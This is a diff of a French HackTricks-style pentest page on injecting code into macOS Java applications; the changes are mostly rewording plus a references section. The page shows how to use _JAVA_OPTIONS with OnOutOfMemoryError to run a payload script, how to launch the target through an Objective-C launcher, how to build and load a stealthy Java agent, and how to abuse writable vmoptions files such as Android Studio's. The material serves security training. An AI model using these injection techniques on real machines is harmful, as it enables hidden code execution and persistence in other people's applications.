@@ -1,10 +1,10 @@
-# Injection dans les applications Java macOS
+# Injection dans les applications Java de macOS
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Énumération
 
-Trouvez les applications Java installées sur votre système. Il a été constaté que les applications Java présentes dans **Info.plist** contiennent certains paramètres Java incluant la chaîne **`java.`**. Vous pouvez donc effectuer une recherche sur celle-ci :
+Trouvez les applications Java installées sur votre système. Il a été constaté que les applications Java dans **Info.plist** contiennent certains paramètres Java qui incluent la chaîne **`java.`** ; vous pouvez donc effectuer une recherche sur celle-ci :
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,13 +14,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-La variable d’environnement **`_JAVA_OPTIONS`** peut être utilisée pour injecter des paramètres Java arbitraires lors de l’exécution d’une application compilée en Java :
+La variable d’environnement **`_JAVA_OPTIONS`** peut être utilisée pour injecter des paramètres arbitraires de la VM Java au démarrage d’une application Java.<sup>[[1]](#references)</sup>
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-Pour l’exécuter en tant que nouveau processus et non en tant qu’enfant du terminal actuel, vous pouvez utiliser :
+Pour l’exécuter en tant que nouveau processus et non comme processus enfant du terminal actuel, vous pouvez utiliser :
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -73,7 +73,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Cependant, cela déclenchera une erreur dans l’application exécutée. Une autre méthode plus furtive consiste à créer un agent Java et à utiliser :
+Cependant, cette technique déclenche une erreur dans l’application exécutée. Une alternative plus furtive consiste à créer un agent Java et à utiliser `-javaagent`:<sup>[[2]](#references)</sup>
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -83,9 +83,9 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 > [!CAUTION]
-> La création de l’agent avec une **version différente de Java** de celle de l’application peut entraîner le crash de l’agent et de l’application
+> La création de l’agent avec une **version différente de Java** de celle de l’application peut faire planter l’agent et l’application.
 
-L’agent peut se trouver à l’emplacement suivant :
+L’agent peut se trouver :
 ```java:Agent.java
 import java.io.*;
 import java.lang.instrument.*;
@@ -102,12 +102,12 @@ err.printStackTrace();
 }
 }
 ```
-Pour compiler l’agent, exécutez :
+Pour compiler l'agent, exécutez :
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
 ```
-Avec `manifest.txt`:
+Avec `manifest.txt` :
 ```
 Premain-Class: Agent
 Agent-Class: Agent
@@ -125,12 +125,12 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 ```
 ## fichier vmoptions
 
-Ce fichier prend en charge la spécification de **Java params** lors de l’exécution de Java. Vous pouvez utiliser certaines des techniques précédentes pour modifier les paramètres Java et **faire exécuter des commandes arbitraires au processus**.\
-De plus, ce fichier peut également **en inclure d’autres** avec le répertoire `include`, vous pouvez donc aussi modifier un fichier inclus.
+Ce fichier permet de spécifier des **paramètres Java** lors de l'exécution de Java. Vous pouvez utiliser certaines techniques précédentes pour modifier les paramètres Java et **faire exécuter des commandes arbitraires au processus**.\
+De plus, ce fichier peut également **inclure d'autres fichiers** avec la directive `include`, vous pouvez donc aussi modifier un fichier inclus.
 
-Mieux encore, certaines applications Java vont **charger plusieurs fichiers `vmoptions`**.
+Plus encore, certaines applications Java **chargeront plusieurs fichiers `vmoptions`**.
 
-Certaines applications, comme Android Studio, indiquent dans leur **output où elles recherchent** ces fichiers, par exemple :
+Certaines applications, telles qu'Android Studio, indiquent dans leur **sortie où elles recherchent** ces fichiers :<sup>[[3]](#references)</sup>
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -141,7 +141,7 @@ Certaines applications, comme Android Studio, indiquent dans leur **output où e
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-S'ils ne le font pas, vous pouvez facilement le vérifier avec :
+Si ce n’est pas le cas, vous pouvez le vérifier avec :
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -149,6 +149,11 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Notez qu’il est intéressant de voir qu’Android Studio essaie de charger le fichier **`/Applications/Android Studio.app.vmoptions`**, un emplacement auquel tout utilisateur du **groupe `admin` dispose d’un accès en écriture.**
+Notez que Android Studio tente de charger **`/Applications/Android Studio.app.vmoptions`** dans cet exemple, un emplacement sur lequel tout utilisateur du **groupe `admin` dispose d’un accès en écriture**.
 
+## References
+
+- [1] [OpenJDK — analyse de `_JAVA_OPTIONS` dans `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
+- [2] [Oracle Java — spécification du package `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
+- [3] [JetBrains — Configuration des options JVM et des propriétés de la plateforme](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
 {{#include ../../../banners/hacktricks-training.md}}
